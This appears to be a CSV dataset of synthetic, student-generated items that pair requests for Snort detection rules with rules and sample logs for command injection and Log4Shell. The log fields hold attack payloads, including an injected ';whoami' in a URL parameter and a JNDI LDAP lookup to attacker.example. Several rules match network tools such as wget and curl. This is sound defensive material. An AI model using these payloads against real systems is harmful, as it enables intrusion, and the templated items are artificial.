id,description_nl,normalized_description,label,attack_type,attack_family,severity,rule,rule_valid_by_parser,rule_validation_errors,option_coverage,source_name,source_url,source_usage,generation_method,log_example
SNORT-RAG-0091,"Formal analyst request: Detect command injection in HTTP parameter using semicolon and whoami. Keywords: curl, whoami. Need a valid alert rule.","formal analyst request: detect command injection in http parameter using semicolon and whoami. keywords: curl, whoami. need a valid alert rule.",malicious,command_injection,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9476262; rev:1;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,GET /ping?host=127.0.0.1;whoami HTTP/1.1
SNORT-RAG-0092,"FR: Detect command injection in HTTP parameter using semicolon and whoami. The rule must use msg, sid, rev and classtype.","fr: detect command injection in http parameter using semicolon and whoami. the rule must use msg, sid, rev and classtype.",malicious,command_injection,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9668299; rev:2;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,GET /ping?host=127.0.0.1;whoami HTTP/1.1
SNORT-RAG-0093,Formal analyst request: A request tries to execute system command through cmd parameter. Target: SMB file server. Include a Snort rule with low false positives.,formal analyst request: a request tries to execute system command through cmd parameter. target: smb file server. include a snort rule with low false positives.,malicious,command_injection,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9894984; rev:3;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,GET /ping?host=127.0.0.1;whoami HTTP/1.1
SNORT-RAG-0094,Technical note: Détecter une injection de commande via une URL HTTP. Observed log: GET /ping?host=127.0.0.1;whoami HTTP/1.1,technical note: détecter une injection de commande via une url http. observed log: get /ping?host=127.0.0.1;whoami http/1.1,malicious,command_injection,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9314571; rev:1;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,GET /ping?host=127.0.0.1;whoami HTTP/1.1
SNORT-RAG-0095,"Technical note: Détecter une injection de commande via une URL HTTP. Keywords: whoami, cmd=. Need a valid alert rule.","technical note: détecter une injection de commande via une url http. keywords: whoami, cmd=. need a valid alert rule.",malicious,command_injection,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9618237; rev:2;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,GET /ping?host=127.0.0.1;whoami HTTP/1.1
SNORT-RAG-0096,"FR: A request tries to execute system command through cmd parameter. The rule must use msg, sid, rev and classtype.","fr: a request tries to execute system command through cmd parameter. the rule must use msg, sid, rev and classtype.",malicious,command_injection,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL COMMAND INJECTION detected""; flow:to_server,established; content:""cmd=""; http_uri; content:"";""; http_uri; pcre:""/(whoami|id|wget|curl)/Ui""; classtype:web-application-attack; sid:9364567; rev:3;)",True,,0.8888888888888888,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,GET /ping?host=127.0.0.1;whoami HTTP/1.1
SNORT-RAG-0097,Technical note: HTTP traffic contains a JNDI LDAP lookup payload. Target: SMB file server. Include a Snort rule with low false positives.,technical note: http traffic contains a jndi ldap lookup payload. target: smb file server. include a snort rule with low false positives.,malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9125797; rev:1;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0098,Student scenario: Détecter une tentative Log4Shell dans les entêtes HTTP. Observed log: User-Agent: ${jndi:ldap://attacker.example/a},student scenario: détecter une tentative log4shell dans les entêtes http. observed log: user-agent: ${jndi:ldap://attacker.example/a},malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9563926; rev:2;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0099,"Student scenario: HTTP traffic contains a JNDI LDAP lookup payload. Keywords: ldap, jndi. Need a valid alert rule.","student scenario: http traffic contains a jndi ldap lookup payload. keywords: ldap, jndi. need a valid alert rule.",malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9423432; rev:3;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0100,"Technical note: HTTP traffic contains a JNDI LDAP lookup payload. The rule must use msg, sid, rev and classtype.","technical note: http traffic contains a jndi ldap lookup payload. the rule must use msg, sid, rev and classtype.",malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9294381; rev:1;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0101,Technical note: HTTP traffic contains a JNDI LDAP lookup payload. Target: Linux SSH bastion. Include a Snort rule with low false positives.,technical note: http traffic contains a jndi ldap lookup payload. target: linux ssh bastion. include a snort rule with low false positives.,malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9846221; rev:2;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0102,Formal analyst request: Détecter une tentative Log4Shell dans les entêtes HTTP. Observed log: User-Agent: ${jndi:ldap://attacker.example/a},formal analyst request: détecter une tentative log4shell dans les entêtes http. observed log: user-agent: ${jndi:ldap://attacker.example/a},malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9226751; rev:3;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0103,"SOC alert description: HTTP traffic contains a JNDI LDAP lookup payload. Keywords: jndi, log4j. Need a valid alert rule.","soc alert description: http traffic contains a jndi ldap lookup payload. keywords: jndi, log4j. need a valid alert rule.",malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9239912; rev:1;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0104,"Student scenario: Detect Log4Shell style ${jndi:ldap://...} in HTTP headers. The rule must use msg, sid, rev and classtype.","student scenario: detect log4shell style ${jndi:ldap://...} in http headers. the rule must use msg, sid, rev and classtype.",malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9047088; rev:2;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0105,Technical note: HTTP traffic contains a JNDI LDAP lookup payload. Target: Windows RDP server. Include a Snort rule with low false positives.,technical note: http traffic contains a jndi ldap lookup payload. target: windows rdp server. include a snort rule with low false positives.,malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9576848; rev:3;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
SNORT-RAG-0106,SOC alert description: HTTP traffic contains a JNDI LDAP lookup payload. Observed log: User-Agent: ${jndi:ldap://attacker.example/a},soc alert description: http traffic contains a jndi ldap lookup payload. observed log: user-agent: ${jndi:ldap://attacker.example/a},malicious,log4shell,web-application-attack,critical,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL LOG4SHELL detected""; flow:to_server,established; content:""${jndi:""; http_header; nocase; pcre:""/\$\{jndi:(ldap|rmi|dns):/Hi""; classtype:web-application-attack; sid:9206102; rev:1;)",True,,1.0,Emerging Threats Open Rules,https://rules.emergingthreats.net/open/snort-2.9.0/emerging.rules.tar.gz,"student-generated scenario based on legitimate Snort syntax/source category, not copied bulk public dataset",manual_seed_plus_template_variation,User-Agent: ${jndi:ldap://attacker.example/a}
